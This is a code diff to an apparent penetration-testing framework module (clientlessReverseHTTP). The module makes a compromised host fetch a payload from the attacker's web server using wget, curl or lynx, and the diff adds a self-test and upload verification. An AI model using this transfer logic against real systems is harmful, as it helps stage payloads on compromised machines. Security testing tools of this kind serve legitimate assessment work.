@@ -25,11 +25,13 @@ from core.controllers.w3afException import *
 from core.data.fuzzer.fuzzer import *
 from core.controllers.payloadTransfer.basePayloadTransfer import basePayloadTransfer as basePayloadTransfer
 
-from core.controllers.daemons.webserver import webserver
+import core.controllers.daemons.webserver as webserver
 from core.controllers.misc.temp_dir import get_temp_dir
+from core.controllers.intrusionTools.execMethodHelpers import getRemoteTempFile
 
 import time
 import os
+
 
 class clientlessReverseHTTP( basePayloadTransfer ):
     '''
@@ -40,8 +42,8 @@ class clientlessReverseHTTP( basePayloadTransfer ):
         - lynx
     '''
 
-    def __init__( self , execMethod, os, inboundPort ):
-        self._execMethod = execMethod
+    def __init__( self , exec_method, os, inboundPort ):
+        self._exec_method = exec_method
         self._os = os
         self._inboundPort = inboundPort
         
@@ -52,12 +54,16 @@ class clientlessReverseHTTP( basePayloadTransfer ):
         This method is used to test if the transfer method works as expected. The implementation of
         this should transfer 10 bytes and check if they arrived as expected to the other end.
         '''
-        # Here i test what remote command we can use to fetch the payload
+        #    Here i test what remote command we can use to fetch the payload
         for fetcher in ['wget', 'curl', 'lynx']:
-            res = self._exec('which ' + fetcher)
+            res = self._exec_method('which ' + fetcher)
             if res.startswith('/'):
+                #    Almost there...
                 self._command = fetcher
-                return True
+                
+                #    Lets really test if the transfer method works.
+                return self.transfer('test_string\n', getRemoteTempFile(self._exec_method) )
+                
         
         return False
     
@@ -86,17 +92,20 @@ class clientlessReverseHTTP( basePayloadTransfer ):
         f.write( strObject )
         f.close()
         
-        # Start a web server on the inbound port and create the file that will be fetched by the compromised host
-        _wS = webserver( cf.cf.getData( 'localAddress' ), self._inboundPort , get_temp_dir() + os.path.sep)
-        _wS.start2()
-        time.sleep(0.2) # wait for webserver thread to start
+        # Start a web server on the inbound port and create the file that 
+        # will be fetched by the compromised host
+        webserver.start_webserver(cf.cf.getData('localAddress'),
+                                  self._inboundPort,
+                                  get_temp_dir() + os.path.sep)
         
-        commandToRun = commandTemplates[ self._command ] % ( cf.cf.getData( 'localAddress' ) , self._inboundPort, filename, destination )
-        self._exec( commandToRun )
+        commandToRun = commandTemplates[self._command] % \
+                            (cf.cf.getData('localAddress'), self._inboundPort,
+                             filename, destination)
+        self._exec_method(commandToRun)
+
+        os.remove(filePath)
         
-        _wS.stop()
-        os.remove( filePath )
-        time.sleep(0.5) # wait for webserver thread to die
+        return self.verify_upload( strObject, destination )
         
     def getSpeed( self ):
         '''
